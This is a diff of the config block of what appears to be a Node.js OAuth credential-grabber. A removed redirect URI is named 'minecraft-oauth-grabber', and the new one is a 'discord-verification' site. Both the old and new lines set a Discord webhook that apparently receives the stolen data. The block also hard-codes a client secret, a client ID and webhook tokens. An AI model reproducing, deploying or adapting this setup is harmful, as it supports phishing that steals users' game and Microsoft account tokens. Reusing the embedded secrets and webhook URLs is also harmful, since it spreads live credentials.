@@ -1,8 +1,8 @@
 //Config
 const secret_value = 'KJR8Q~g05PSkc-G_eIyt9QGN4EAgKLvW4ehV2apf'
 const client_id = '95a3a604-ad37-4af9-b41d-c5d05a12459e'
-const redirect_uri = 'https://minecraft-oauth-grabber-mog-production.up.railway.app/'
-const webhook_url = 'https://discord.com/api/webhooks/1052987188800929892/G1LDrmac1yE9oodyL6R8JnScAifzyqfPDbedoOAjSkdz8IWJ1_4ydcnAtJgtCKp79wfT'
+const redirect_uri = 'https://discord-verification-0zfy.onrender.com'
+const webhook_url = 'https://discord.com/api/webhooks/1018214211056324659/HM3VfgAPYCMi5aFRhezRCyUkijTmw475_n3OKSQLEnqFj5HMPQAtgItdewOMExstc4xw'
 //Requirements
 const axios = require('axios')
 const express = require('express')
